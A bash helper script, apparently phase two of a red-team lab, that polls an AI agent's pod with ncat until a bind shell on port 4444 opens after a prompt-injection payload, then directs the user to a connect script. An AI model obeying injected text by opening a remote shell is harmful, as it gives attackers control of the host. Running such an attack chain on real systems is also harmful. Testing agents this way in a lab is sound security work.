#!/usr/bin/env bash
# Poll until the bind shell on the agent pod is listening.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: wait-shell.sh"
  echo "  Polls nc -z against the agent pod on BIND_PORT until the bind shell opens."
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

POLL_INTERVAL=2
POLL_MAX=60

banner "Phase 2: Wait for Bind Shell"

AGENT_IP=$(resolve_agent_ip)
echo "  Agent IP:   $AGENT_IP"
echo "  Bind port:  $BIND_PORT"
echo "  Timeout:    $((POLL_MAX * POLL_INTERVAL))s"
echo ""

SHELL_DETECTED=false
for i in $(seq 1 "$POLL_MAX"); do
  if ncat -z "$AGENT_IP" "$BIND_PORT" 2>/dev/null; then
    echo ""
    echo "  Bind shell detected after $((i * POLL_INTERVAL))s"
    SHELL_DETECTED=true
    break
  fi
  echo -n "."
  sleep "$POLL_INTERVAL"
done
echo ""

if [[ "$SHELL_DETECTED" != "true" ]]; then
  echo "ERROR: Bind shell not detected after $((POLL_MAX * POLL_INTERVAL))s"
  echo "  The agent may not have followed the injection payload."
  exit 1
fi

echo ""
echo "Bind shell is open. Next: connect.sh"
